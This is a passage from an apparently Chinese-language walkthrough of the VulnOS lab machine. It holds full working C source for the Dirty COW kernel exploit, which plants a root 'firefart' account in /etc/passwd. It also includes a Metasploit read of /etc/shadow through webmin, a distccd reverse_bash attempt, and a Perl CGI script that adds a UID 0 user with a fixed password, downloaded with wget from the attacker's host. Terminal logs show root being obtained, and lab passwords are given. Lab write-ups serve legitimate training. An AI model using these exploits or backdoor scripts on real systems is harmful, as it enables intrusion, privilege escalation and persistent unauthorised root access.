class="type">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="type">char</span> *username;</span><br><span class="line">   <span class="type">char</span> *hash;</span><br><span class="line">   <span class="type">int</span> user_id;</span><br><span class="line">   <span class="type">int</span> group_id;</span><br><span class="line">   <span class="type">char</span> *info;</span><br><span class="line">   <span class="type">char</span> *home_dir;</span><br><span class="line">   <span class="type">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">generate_password_hash</span><span class="params">(<span class="type">char</span> *plaintext_pw)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">generate_passwd_line</span><span class="params">(<span class="keyword">struct</span> Userinfo u)</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="type">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="type">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">copy_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *from, <span class="type">const</span> <span class="type">char</span> *to)</span> &#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="type">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="type">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="type">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="type">unsigned</span> <span class="type">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="type">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于靶机已经安装了 <code>gcc</code> ，可直接在靶机执行
+<code>gcc -pthread dirty.c -o dirty -lcrypt</code>
+【靶机未安装的情况下可在本地静态编译后传上去利用】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405281035820.png" /></p>
+<p>成功写入 firefart 用户</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405281035821.png" /></p>
+<p>获得 root 权限</p>
+<h2 id="回顾">3. 回顾</h2>
+<h3 id="webmin-任意文件读取">3.1. webmin 任意文件读取</h3>
+<p>webmin 存在任意文件读取漏洞【CVE-2006-3392】</p>
+<p>利用 msf 中的 <code>auxiliary/admin/webmin/file_disclosure</code>
+可直接读取 <code>/etc/passwd</code>，<code>/etc/shadow</code> 等文件</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405281205385.png" /></p>
+<p>可直接尝试破解密码 hash</p>
+<h3 id="distccd-服务">3.2. distccd 服务</h3>
+<blockquote>
+<p>端口3632/tcp是distccd服务的默认端口。distccd是一个分布式C/C++编译器服务，允许远程主机通过网络连接到该服务，并在远程主机上编译代码。通过distccd，可以利用多台计算机的
+CPU 资源来加速代码编译过程。<br />
+在默认情况下，distccd服务监听3632/tcp端口，允许其他主机连接并发送编译任务。一旦连接建立，distccd会在远程主机上执行编译任务，并将结果返回给客户端。</p>
+</blockquote>
+<p>前面 nmap 没扫描出来服务，不过可用下面命令扫出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 10.0.3.21 -p3632    </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 00:07 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.21</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3632/tcp open  distccd</span><br><span class="line">MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.22 seconds</span><br></pre></td></tr></table></figure>
+<p>distccd 存在命令执行漏洞，尝试反弹 shell，未成功！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/misc/distcc_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/misc/distcc_exec):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  10.0.3.21        <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT   3632             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_bash):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.0.3.5         <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  9999             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/misc/distcc_exec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.3.5:9999 </span><br><span class="line">[-] 10.0.3.21:3632 - Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+<h3 id="提权-1">3.3. 提权-1</h3>
+<p>利用 <code>Dirty COW</code>
+提权非作者本意，系统有很多普通用户，不过个人没找到密码和提权到普通用户的方法，看了几个
+Write-up ，大多数的思路是：</p>
+<p><code>/usr/lib/cgi-bin/nagios3</code> <span
+class="math inline">\(\Rightarrow\)</span>
+<code>/etc/nagios3/htpasswd.users</code> <span
+class="math inline">\(\Rightarrow\)</span>
+<code>nagiosadmin:8A86JOBWoCwnk</code> <span
+class="math inline">\(\Rightarrow\)</span>
+<code>nagiosadmin:canuhack</code> <span
+class="math inline">\(\Rightarrow\)</span>
+<code>vulnosadmin:canuhackme</code> <span
+class="math inline">\(\Rightarrow\)</span> <code>sudo -l</code> <span
+class="math inline">\(\Rightarrow\)</span> <code>sudo su</code></p>
+<blockquote>
+<p><code>htpasswd.users</code> 通常与 Apache HTTP
+服务器一起使用，用于存储基于 HTTP Basic
+认证的用户名和密码，存储的密码是经过加密算法处理的密码</p>
+</blockquote>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405281053912.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405281053913.png" /></p>
+<p><code>nagiosadmin:canuhack</code> <span
+class="math inline">\(\Rightarrow\)</span>
+<code>vulnosadmin:canuhackme</code> …………这一步想不到………………</p>
+<h3 id="提权-2">3.4. 提权-2</h3>
+<blockquote>
+<p>参考：<a
+target="_blank" rel="noopener" href="https://naveen194.blogspot.com/2016/10/vulnos-solution.html">Information
+Security: VulnOS Solution</a></p>
+</blockquote>
+<p>webmin 是以 root 权限运行的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@VulnOS:/usr/lib$ ps aux | grep webmin</span><br><span class="line">ps aux | grep webmin</span><br><span class="line">firefart  2155  0.0  0.6   6736  3532 ?        Ss   May27   0:00 /usr/bin/perl /var/www/webmin-1.280/miniserv.pl /etc/webmin/miniserv.conf</span><br><span class="line">www-data 17332  0.0  0.1   1888   580 pts/1    R+   08:42   0:00 grep webmin</span><br></pre></td></tr></table></figure>
+<p>服务端又支持 CGI ，为此可写个 CGI 提权脚本，再结合 3.1
+的漏洞触发，以添加 root 权限的用户为例</p>
+<p>add_root_user.cgi</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;content-type: text/html\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;useradd -o -u 0 -g 0 -m -s /bin/bash superb;echo &#x27;superb:superbpass&#x27; | chpasswd&quot;</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>add_root_user.cgi</code> 脚本是一个 Perl 脚本，用于创建一个名为
+<code>superb</code>
+的新用户，并将其添加到系统中。这个用户将具有超级用户（UID和GID为0）权限，并且其登录
+shell 将设置为 <code>/bin/bash</code>。<br />
+在 <code>add_root_user.cgi</code> 中，首先设置了 HTTP 响应的内容类型为
+<code>text/html</code>，这是 Web
+服务器响应的标准方式，告诉浏览器返回的内容是 HTML 格式的。<br />
+然后，使用 <code>exec</code> 命令执行了一个系统命令，即
+<code>useradd -o -u 0 -g 0 -m -s /bin/bash superb</code>，这个命令的目的是在系统中创建一个名为
+<code>superb</code> 的用户，并指定其 UID 和 GID 为0，即超级用户权限。
+<code>-m</code> 选项表示同时创建用户的主目录。<code>-s /bin/bash</code>
+指定了用户的登录 shell 为 <code>/bin/bash</code>。<br />
+接下来，使用管道将密码 <code>superbpass</code> 传递给
+<code>chpasswd</code> 命令，以更改 <code>superb</code>
+用户的密码。这样，新用户 <code>superb</code> 的密码将被设置为
+<code>superbpass</code>。</p>
+</blockquote>
+<p>将 <code>add_root_user.cgi</code> 脚本传至
+<code>/usr/lib/cgi-bin/</code> 【<code>www-data</code>
+有写权限的位置即可，如 <code>/tmp</code>
+下亦可，示例见后】下并赋予执行权限
+<code>chmod +x add_root_user.cgi</code> ，示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">www-data@VulnOS:/usr/lib$ <span class="built_in">ls</span> -al | grep cgi-bin</span><br><span class="line"><span class="built_in">ls</span> -al | grep cgi-bin</span><br><span class="line">drwxrwxrwx  3 firefart root       4096 Mar 11  2014 cgi-bin</span><br><span class="line">www-data@VulnOS:/usr/lib$ </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/usr/lib$ <span class="built_in">cd</span> cgi-bin</span><br><span class="line"><span class="built_in">cd</span> cgi-bin</span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ wget http://10.0.3.5:8080/add_root_user.cgi</span><br><span class="line">wget http://10.0.3.5:8080/add_root_user.cgi</span><br><span class="line">--2024-05-28 08:34:27--  http://10.0.3.5:8080/add_root_user.cgi</span><br><span class="line">Connecting to 10.0.3.5:8080... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 144 [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;add_root_user.cgi&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 144         --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2024-05-28 08:34:27 (2.21 MB/s) - <span class="string">&#x27;add_root_user.cgi&#x27;</span> saved [144/144]</span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 7328</span><br><span class="line">drwxrwxrwx  3 firefart root        4096 May 28 08:34 .</span><br><span class="line">drwxr-xr-x 98 firefart root       24576 Mar 15  2014 ..</span><br><span class="line">-rw-rw-rw-  1 www-data www-data     144 May 28 08:33 add_root_user.cgi</span><br><span class="line">drwxr-xr-x  2 firefart root        4096 Mar 11  2014 nagios3</span><br><span class="line">lrwxrwxrwx  1 firefart root          29 Mar  9  2014 php -&gt; /etc/alternatives/php-cgi-bin</span><br><span class="line">-rwxr-xr-x  1 firefart root     7458892 Mar  1  2014 php5</span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ <span class="built_in">cat</span> add_root_user.cgi</span><br><span class="line"><span class="built_in">cat</span> add_root_user.cgi</span><br><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;content-type: text/html\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;useradd -o -u 0 -g 0 -m -s /bin/bash superb;echo &#x27;superb:superbpass&#x27; | chpasswd&quot;</span>;</span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ <span class="built_in">cat</span> /etc/passwd | grep superb</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep superb</span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ <span class="built_in">chmod</span> +x add_root_user.cgi</span><br><span class="line"><span class="built_in">chmod</span> +x add_root_user.cgi</span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ <span class="built_in">ls</span> -al </span><br><span class="line"><span class="built_in">ls</span> -al </span><br><span class="line">total 7328</span><br><span class="line">drwxrwxrwx  3 firefart root        4096 May 28 08:34 .</span><br><span class="line">drwxr-xr-x 98 firefart root       24576 Mar 15  2014 ..</span><br><span class="line">-rwxrwxrwx  1 www-data www-data     144 May 28 08:33 add_root_user.cgi</span><br><span class="line">drwxr-xr-x  2 firefart root        4096 Mar 11  2014 nagios3</span><br><span class="line">lrwxrwxrwx  1 firefart root          29 Mar  9  2014 php -&gt; /etc/alternatives/php-cgi-bin</span><br><span class="line">-rwxr-xr-x  1 firefart root     7458892 Mar  1  2014 php5</span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405281508916.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ <span class="built_in">cat</span> /etc/passwd | grep superb</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep superb</span><br><span class="line">superb:x:0:0::/home/superb:/bin/bash</span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/usr/lib/cgi-bin$ su superb    </span><br><span class="line">su superb</span><br><span class="line">Password: superbpass</span><br><span class="line"></span><br><span class="line">firefart@VulnOS:/usr/lib/cgi-bin<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(firefart) gid=0(root) groepen=0(root)</span><br></pre></td></tr></table></figure>
+<p>注，firefart 是因为前面用 <code>Dirty COW</code> 提权后未作恢复！</p>
+<p><code>/tmp</code> 下示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">www-data@VulnOS:/usr/lib$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@VulnOS:/tmp$ wget http://10.0.3.5:8080/add_root_user.cgi</span><br><span class="line">wget http://10.0.3.5:8080/add_root_user.cgi</span><br><span class="line">--2024-05-28 09:13:52--  http://10.0.3.5:8080/add_root_user.cgi</span><br><span class="line">Connecting to 10.0.3.5:8080... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 161 [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;add_root_user.cgi&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 161         --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2024-05-28 09:13:52 (2.23 MB/s) - <span class="string">&#x27;add_root_user.cgi&#x27;</span> saved [161/161]</span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/tmp$ <span class="built_in">chmod</span> +x add_root_user.cgi</span><br><span class="line"><span class="built_in">chmod</span> +x add_root_user.cgi</span><br><span class="line">www-data@VulnOS:/tmp$ <span class="built_in">ls</span> -al add_root_user.cgi</span><br><span class="line"><span class="built_in">ls</span> -al add_root_user.cgi</span><br><span class="line">-rwxrwxrwx 1 www-data www-data 161 May 28 09:13 add_root_user.cgi</span><br><span class="line">www-data@VulnOS:/tmp$ <span class="built_in">cat</span> add_root_user.cgi</span><br><span class="line"><span class="built_in">cat</span> add_root_user.cgi</span><br><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;content-type: text/html\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;useradd -o -u 0 -g 0 -m -s /bin/bash www-data-root;echo &#x27;www-data-root:www-data-root&#x27; | chpasswd&quot;</span>;</span><br><span class="line">www-data@VulnOS:/tmp$ </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/tmp$ <span class="built_in">cat</span> /etc/passwd | grep www-data-root</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep www-data-root</span><br><span class="line">www-data@VulnOS:/tmp$ </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/tmp$ <span class="built_in">cat</span> /etc/passwd | grep www-data-root</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep www-data-root</span><br><span class="line">www-data-root:x:0:0::/home/www-data-root:/bin/bash</span><br><span class="line">www-data@VulnOS:/tmp$    </span><br><span class="line"></span><br><span class="line">www-data@VulnOS:/tmp$ su www-data-root</span><br><span class="line">su www-data-root</span><br><span class="line">Password: www-data-root</span><br><span class="line"></span><br><span class="line">firefart@VulnOS:/tmp<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(firefart) gid=0(root) groepen=0(root)</span><br><span class="line">firefart@VulnOS:/tmp<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">firefart@VulnOS:/tmp<span class="comment"># cd ~</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">firefart@VulnOS:~<span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/www-data-root</span><br><span class="line">firefart@VulnOS:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p>注，查找当前用户有写权限的文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> d -writable 2&gt;/dev/null   </span><br></pre></td></tr></table></figure>
+<p>TRY HARDER !</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
